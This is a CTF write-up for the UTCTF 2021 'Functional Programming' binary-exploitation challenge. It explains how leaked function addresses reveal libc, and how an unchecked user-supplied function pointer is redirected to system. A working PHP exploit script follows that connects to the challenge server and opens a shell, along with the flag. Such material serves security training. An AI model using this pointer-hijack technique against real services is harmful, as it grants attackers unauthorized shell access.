# Functional Programming - UTCTF 2021 (pwn, 950p, 72 solved)

## Introduction
Functional Programming is a binary exploitation task.

An x64 ELF binary is given. This binary asks for a list of `n` elements (with
`n` being specified by the user). It then prints the list and asks for a
parameter (`increment`, `positive`, `abs`) and a function (`map`, `filter`). The
binary shows then the list after applying the parameters and exits.

## Reverse engineering
The binary prints the addresses of the `increment`, `positive` and `abs`
functions. It also prints the addresses of the `map` and `filter` functions
later.

These functions are located at the following address:
- `increment`: PIE + `0xAB5`
- `positive`: PIE + `0xAC4`
- `abs`: libc + `0x3A640`
- `map`: PIE + `0x950`
- `filter`: PIE + `0x9d5`

These values can be used to leak the address where the libc and the main binary
are located.

The binary takes two addresses from the user: `parameter` and `function`. It
calls `function(list, parameter)`

## Vulnerabilities
The program does not check the values of `function` and `parameter`. It happily
takes any pointers given by the user and jumps to it.

## Exploitation
The exploitation is straightforward : leak libc from the `abs` address, set
`function` to the address of `system` and put `/bin/sh` in `list`.

**Flag**: `utflag{lambda_calculus_pog891234}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "Socket.php";

const OFF_ABS    = 0x0003A640;
const OFF_SYSTEM = 0x000453a0;

$payload = unpack("V", str_pad("sh", 4, "\x00"))[1];

const HOST = "pwn.utctf.live";
const PORT = 5432;

printf("[*] Creating process\n");
$time = microtime(true);
$t = new SocketTube(HOST, PORT);
printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$t->expect("Enter the length of the list: ");
$t->write("1\n");

$t->expect("Enter element 0: ");
$t->write("$payload\n");

$t->expectLine("Your list is: $payload ");

$t->expectLine("Pick a parameter:");
$t->expect("Increment: 0x"); $t->readLine();
$t->expect("Positive: 0x");  $t->readLine();
$t->expect("Abs: 0x");       $abs = $t->readLine();
$t->write("586552\n");

$libc   = hexdec($abs) - OFF_ABS;
$system = $libc + OFF_SYSTEM;

$t->expectLine("Pick a function:");
$t->expect("Map: 0x"); $t->readLine();
$t->expect("Filter: 0x"); $t->readLine();
$t->write(dechex($system) . "\n");

printf("[!] Shell\n");
$t->pipe();
```
